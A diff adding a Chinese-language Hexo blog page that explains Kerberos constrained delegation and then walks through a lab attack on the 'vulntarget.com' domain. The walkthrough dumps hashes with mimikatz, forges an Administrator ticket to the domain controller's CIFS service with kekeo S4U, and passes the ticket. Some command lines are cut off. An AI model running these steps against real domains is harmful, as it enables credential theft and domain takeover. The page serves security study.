@@ -1,0 +1,597 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="永安寺">
+  <meta name="keywords" content="">
+  
+  <title>约束委派 - Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="约束委派">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      永安寺
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-04 21:57" pubdate>
+        2022年3月4日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">约束委派</h1>
+            
+            <div class="markdown-body">
+              <p><strong>由于非约束委派的不安全性</strong>，微软在windows2003中发布了约束委派的功能，如下所示</p>
+<p>在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，<strong>不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</strong></p>
+<p>这里就引入了两个新的概念</p>
+<h2 id="S4U2Self和S4U2Proxy"><a href="#S4U2Self和S4U2Proxy" class="headerlink" title="S4U2Self和S4U2Proxy"></a>S4U2Self和S4U2Proxy</h2><h3 id="S4U2self"><a href="#S4U2self" class="headerlink" title="S4U2self"></a>S4U2self</h3><p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p>
+<h3 id="S4U2proxy"><a href="#S4U2proxy" class="headerlink" title="S4U2proxy"></a>S4U2proxy</h3><p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>用户请求一个约束委派的服务流程图如下：</p>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215104201928.png" srcset="/img/loading.gif" lazyload alt="image-20220215104201928"></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">1</span>.用户向Service1发送请求<br><br><span class="hljs-number">2</span>.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT1票据（Forwardable标记），然后通过S4U2self扩展模拟用户向KDC请求<span class="hljs-built_in">ST</span>。<br><br><span class="hljs-number">3.</span>KDC这时返回给Service1一个用于用户验证Service1的<span class="hljs-built_in">ST</span>（我们称为<span class="hljs-built_in">ST1</span>）（Forwardable标记），并且Service1用这个<span class="hljs-built_in">ST1</span>完成和用户的验证过程。<br><br><span class="hljs-number">4.</span>Service1在步骤<span class="hljs-number">3</span>使用模拟用户申请KDC所获得的<span class="hljs-built_in">ST1</span>票据与User进行验证，然后响应用户的请求。<br><br>注:这个过程其实Service1是获得了用户的<span class="hljs-built_in">ST1</span>和TGT的，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。<br><br><span class="hljs-number">5</span>.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。<br><br>	A。Service1已经通过验证，并且有一个有效的TGT。<br><br>	B。Service1有从用户到Service1的forwardableST（可转发<span class="hljs-built_in">ST</span>），此处我认为，根据流程来看，可转发<span class="hljs-built_in">ST1</span>其实就是<span class="hljs-built_in">ST1</span>，用于(<span class="hljs-number">6</span>)的验证<br><br><span class="hljs-number">6.</span>Service1代表用户向Service2请求一个用于认证Service2的<span class="hljs-built_in">ST</span>(称之为<span class="hljs-built_in">ST2</span>)。用户在<span class="hljs-built_in">ST1</span>中通过cname (client name) 和crealm(client name)进行标示。<br><br><span class="hljs-number">7.</span>KDC接收到(<span class="hljs-number">6</span>)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回<span class="hljs-built_in">ST2</span>给service1,不过这个<span class="hljs-built_in">ST2</span>中的cname crealm标示的是用户而不是service1。<br><br><span class="hljs-number">8.</span>service1代表用户使用<span class="hljs-built_in">ST2</span>请求访问Service2<br><br><span class="hljs-number">9.</span>Service2响应Service1的请求<br><br><span class="hljs-number">10.</span>Service1将Service2的响应转发给User。<br></code></pre></td></tr></table></figure>
+
+<p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p>
+<p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p>
+<p>查询非约束委派主要是通过搜索userAccountControl属性包含<code>ADS_UF_TRUSTED_FOR_DELEGATION</code>的主机或账户</p>
+<p>非约束委派的查询：</p>
+<p>通过Import-Module PowerView.ps1加载PowerView脚本之后使用下面的命令进行查询。</p>
+<p>查询域中配置非约束委派的账户：<br><code>Get-NetUser -Unconstrained -Domain rootkit.org</code></p>
+<p>查询域中配置非约束委派的主机：<br><code>Get-NetComputer -Unconstrained -Domain rootkit.org</code></p>
+<p>查询约束委派则通过搜索userAccountControl属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>的主机或用户</p>
+<p>约束委派的查询：</p>
+<p>查询域中配置约束委派的账户：<br><code>Get-DomainUser -TrustedToAuth -Domain rootkit.org</code></p>
+<p>查询域中配置约束委派的主机:<br><code>Get-DomainComputer -TrustedToAuth -Domain rootkit.org</code></p>
+<h4 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a><strong>前期准备</strong>：</h4><p> 域控机为域用户配置SPN，用于域用户配置约束委派</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">setspn</span> -U -A SQL/test win<span class="hljs-number">2016</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113044390.png" srcset="/img/loading.gif" lazyload alt="image-20220215113044390"></p>
+<p>此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。</p>
+<p>为win2016用户配置约束委派，做win2 019机器的cifs服务的委派</p>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113056606.png" srcset="/img/loading.gif" lazyload alt="image-20220215113056606"></p>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113103146.png" srcset="/img/loading.gif" lazyload alt="image-20220215113103146"></p>
+<p>此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派</p>
+<h4 id="发现约束委派"><a href="#发现约束委派" class="headerlink" title="发现约束委派:"></a>发现约束委派:</h4><p>使用Adfind.exe尝试发现约束委派</p>
+<h6 id="查找域中配置约束委派用户"><a href="#查找域中配置约束委派用户" class="headerlink" title="查找域中配置约束委派用户"></a>查找域中配置约束委派用户</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AdFind</span>.</span></span>exe -b <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113117420.png" srcset="/img/loading.gif" lazyload alt="image-20220215113117420"></p>
+<p>发现win2016用户存在约束委派，委派了win2019机器的cifs服务</p>
+<h6 id="在域中查找配置了约束委派主机"><a href="#在域中查找配置了约束委派主机" class="headerlink" title="在域中查找配置了约束委派主机"></a>在域中查找配置了约束委派主机</h6><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AdFind</span>.</span></span>exe -b <span class="hljs-string">&quot;DC=vulntarget,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*)</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到主机Win2016存在约束委派，委派了win2019机器的cifs服务</p>
+<h4 id="攻击利用："><a href="#攻击利用：" class="headerlink" title="攻击利用："></a>攻击利用：</h4><h5 id="域用户存在约束委派"><a href="#域用户存在约束委派" class="headerlink" title="域用户存在约束委派:"></a><strong>域用户存在约束委派:</strong></h5><h6 id="kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kekeo # tgt::ask /<span class="hljs-keyword">user</span>:win2016 /<span class="hljs-keyword">domain</span>:vulntarget.com /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">Admin</span>#<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113137733.png" srcset="/img/loading.gif" lazyload alt="image-20220215113137733"></p>
+<h6 id="kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据</h6><p>利用mimikatz拿到域用户win2016的NTLM hash进行利用</p>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113407517.png" srcset="/img/loading.gif" lazyload alt="image-20220215113407517"></p>
+<p>这里  明文密码 和  hash  任选其一来操作 申请TGT</p>
+<blockquote>
+<p>kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e</p>
+</blockquote>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113638058.png" srcset="/img/loading.gif" lazyload alt="image-20220215113638058"></p>
+<h6 id="利用kekeo进行S4U伪造-申请TGS服务票据"><a href="#利用kekeo进行S4U伪造-申请TGS服务票据" class="headerlink" title="利用kekeo进行S4U伪造 申请TGS服务票据"></a>利用kekeo进行S4U伪造 申请TGS服务票据</h6><p>利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务 也就是前面的win2019</p>
+<blockquote>
+<p>tgs::s4u /tgt:<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x77;&#105;&#x6e;&#50;&#x30;&#x31;&#x36;&#64;&#x56;&#x55;&#x4c;&#x4e;&#x54;&#65;&#x52;&#x47;&#x45;&#x54;&#x2e;&#67;&#79;&#x4d;&#x5f;&#107;&#x72;&#98;&#x74;&#103;&#116;">&#x54;&#x47;&#x54;&#x5f;&#x77;&#105;&#x6e;&#50;&#x30;&#x31;&#x36;&#64;&#x56;&#x55;&#x4c;&#x4e;&#x54;&#65;&#x52;&#x47;&#x45;&#x54;&#x2e;&#67;&#79;&#x4d;&#x5f;&#107;&#x72;&#98;&#x74;&#103;&#116;</a>~vulntarget.com@VULNTARGET.COM.kirbi /user:<a href="mailto:&#x41;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x40;&#118;&#117;&#x6c;&#110;&#116;&#x61;&#x72;&#x67;&#101;&#116;&#46;&#x63;&#111;&#x6d;">&#x41;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x40;&#118;&#117;&#x6c;&#110;&#116;&#x61;&#x72;&#x67;&#101;&#116;&#46;&#x63;&#111;&#x6d;</a> /service:cifs/win2019.vulntarget.com</p>
+</blockquote>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113831607.png" srcset="/img/loading.gif" lazyload alt="image-20220215113831607"></p>
+<h6 id="PTT利用拿到的TGS票据"><a href="#PTT利用拿到的TGS票据" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><p>通过mimikatz进行ptt拿到域控机的cifs服务使用权限</p>
+<blockquote>
+<p>kerberos::ptt <a href="mailto:&#84;&#71;&#83;&#95;&#65;&#100;&#109;&#105;&#110;&#x69;&#115;&#x74;&#x72;&#97;&#x74;&#x6f;&#x72;&#64;&#118;&#x75;&#108;&#110;&#x74;&#97;&#114;&#103;&#101;&#x74;&#x2e;&#99;&#111;&#109;">&#84;&#71;&#83;&#95;&#65;&#100;&#109;&#105;&#110;&#x69;&#115;&#x74;&#x72;&#97;&#x74;&#x6f;&#x72;&#64;&#118;&#x75;&#108;&#110;&#x74;&#97;&#114;&#103;&#101;&#x74;&#x2e;&#99;&#111;&#109;</a>@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</p>
+</blockquote>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113909034.png" srcset="/img/loading.gif" lazyload alt="image-20220215113909034"></p>
+<p>注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。</p>
+<p>查看域控机的共享目录成功！</p>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113956538.png" srcset="/img/loading.gif" lazyload alt="image-20220215113956538"></p>
+<h5 id="域主机存在约束委派"><a href="#域主机存在约束委派" class="headerlink" title="域主机存在约束委派:"></a>域主机存在约束委派:</h5><p>通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+
+<p>注:需要管理员权限才可拿到密码Hash</p>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120213597.png" srcset="/img/loading.gif" lazyload alt="image-20220215120213597"></p>
+<h6 id="kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"><a href="#kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT" class="headerlink" title="kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"></a>kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tgt</span>::ask /user:win<span class="hljs-number">2016</span>$ /domain:vulntarget.com /NTLM:e<span class="hljs-number">0</span>cd<span class="hljs-number">419213811</span>fd<span class="hljs-number">910</span>ca<span class="hljs-number">6</span>c<span class="hljs-number">3</span>c<span class="hljs-number">42</span>d<span class="hljs-number">764</span>e<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120223916.png" srcset="/img/loading.gif" lazyload alt="image-20220215120223916"></p>
+<p>注:带有$符号的用户一般都是服务主机账户，而非普通用户</p>
+<h6 id="通过kekeo进行S4U伪造"><a href="#通过kekeo进行S4U伪造" class="headerlink" title="通过kekeo进行S4U伪造"></a>通过kekeo进行S4U伪造</h6><p>如此，成功拿到了对应委派服务的TGS票据</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">kekeo <span class="hljs-comment"># tgs::s4u /tgt:TGT_win2016$<span class="hljs-doctag">@VULNTARGET</span>.COM_krbtgt~vulntarget.com<span class="hljs-doctag">@VULNTARGET</span>.COM.kirbi /user:A</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120255259.png" srcset="/img/loading.gif" lazyload alt="image-20220215120255259"></p>
+<h6 id="PTT利用拿到的TGS票据-1"><a href="#PTT利用拿到的TGS票据-1" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kerberos::ptt TGS_Administrator<span class="hljs-variable">@vulntarget</span>.com<span class="hljs-variable">@VULNTARGET</span>.COM_cifs~win2019.vulntarget.com<span class="hljs-variable">@VULNTARGET</span>.COM.kirbi<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120311877.png" srcset="/img/loading.gif" lazyload alt="image-20220215120311877"></p>
+<p>尝试对域控进行共享目录访问,利用成功！</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\win2019.vulntarget.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120322866.png" srcset="/img/loading.gif" lazyload alt="image-20220215120322866"></p>
+<p>注: 此处进行tgs::s4u伪造时，申请的service是cifs/win2019.vulntarget.com时；我们在使用时就应该是dir \win2019.vulntarget.com\c$ 这样才能访问成功，若dir \win2019\c$则会访问失败，反之亦然！</p>
+<h3 id="关于约束委派的防御方法："><a href="#关于约束委派的防御方法：" class="headerlink" title="关于约束委派的防御方法："></a>关于约束委派的防御方法：</h3><p>1、高权限用户没有在特殊要求之下设置为不可委派，比如administrator</p>
+<p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215121324029.png" srcset="/img/loading.gif" lazyload alt="image-20220215121324029"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91/">内网</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91/">内网</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/04/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">基于资源的约束委派</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/">
+                        <span class="hidden-mobile">非约束委派</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
